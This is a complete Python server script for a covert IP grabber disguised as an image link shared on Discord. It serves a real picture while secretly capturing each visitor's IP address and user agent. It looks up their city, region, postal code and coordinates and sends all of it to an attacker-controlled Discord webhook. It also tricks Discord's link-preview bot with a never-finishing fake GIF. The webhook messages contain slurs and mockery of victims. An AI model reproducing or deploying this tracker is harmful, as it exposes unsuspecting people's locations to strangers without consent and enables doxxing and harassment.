from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import httpx
import base64
import httpagentparser

# === CHANGE THIS TO YOUR REAL DISCORD WEBHOOK URL ===
webhook = 'https://discord.com/api/webhooks/YOUR/WEBHOOK/HERE'

# The real image shown when they click the link
bindata = httpx.get('https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1').content

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "bobs slave",
        "content": "@everyone",
        "embeds": [
            {
                "title": "DADDY BOB STRIKES AGAIN!",
                "color": 16711803,
                "description": "A New Retard Opened The 'Gif' LOL.",
                "author": {"name": "Fentanyl"},
                "fields": [
                    {
                        "name": "IP Info",
                        "value": f"**IP:** {ip}\n**City:** {city}\n**Region:** {reg}\n**Country:** {country}\n**Location:** {loc}\n**ORG:** {org}\n**ZIP:** {postal}",
                        "inline": True
                    },
                    {
                        "name": "Advanced Info",
                        "value": f"**OS:** {os}\n**Browser:** {browser}\n**UserAgent:** {useragent}",
                        "inline": False
                    }
                ]
            }
        ]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [
            {
                "title": "Fentanyl Alert!",
                "color": 16711803,
                "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** {ip}\n**UserAgent:** {uag}",
                "author": {"name": "Fentanyl"}
            }
        ]
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get real IP (first in x-forwarded-for list)
            forwarded = self.headers.get('x-forwarded-for')
            ip = forwarded.split(',')[0].strip() if forwarded else 'Unknown'
            useragent = self.headers.get('user-agent', 'No User Agent Found!')
            os, browser = httpagentparser.simple_detect(useragent)

            # 1. DISCORD PREVIEW DETECTION (Infinite Loading Glitch)
            if 'discord' in useragent.lower() or 'ExternalHit' in useragent:
                self.send_response(200)
                self.send_header('Content-type', 'image/gif')
                # Trick Discord into waiting for a massive file that never finishes
                self.send_header('Content-Length', '9999999') 
                self.end_headers()
                
                # Send just the start of a GIF header to trigger the loading state
                self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
                
                # Notify webhook that Discord is previewing
                httpx.post(webhook, json=prev(ip, useragent))
                return

            # 2. REAL USER DETECTION (Grab and Serve)
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(bindata)

            # Fetch IP info and send to webhook
            try:
                ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                payload = formatHook(
                    ipInfo.get('ip', ip),
                    ipInfo.get('city', 'Unknown'),
                    ipInfo.get('region', 'Unknown'),
                    ipInfo.get('country', 'Unknown'),
                    ipInfo.get('loc', 'Unknown'),
                    ipInfo.get('org', 'Unknown'),
                    ipInfo.get('postal', 'Unknown'),
                    useragent, os, browser
                )
                httpx.post(webhook, json=payload)
            except Exception:
                httpx.post(webhook, json=formatHook(ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', useragent, os, browser))

        except Exception as e:
            # Emergency fallback
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(bindata)

# To run locally for testing:
if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8080), handler)
    print("Server started on port 8080...")
    server.serve_forever()
